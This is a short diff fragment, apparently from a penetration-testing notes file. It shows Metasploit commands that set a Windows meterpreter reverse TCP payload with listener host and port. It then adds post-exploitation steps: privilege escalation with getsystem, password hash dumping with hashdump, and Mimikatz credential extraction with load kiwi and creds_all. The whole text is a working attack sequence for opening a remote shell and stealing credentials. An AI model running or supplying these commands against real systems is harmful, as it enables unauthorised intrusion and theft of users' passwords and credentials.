@@ -6,3 +6,12 @@ set payload windows/x64/meterpreter_reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 4444
 run
+
+-- Post exploitation
+getuid
+sysinfo
+getsystem
+hashdump
+load kiwi
+creds_all
+```
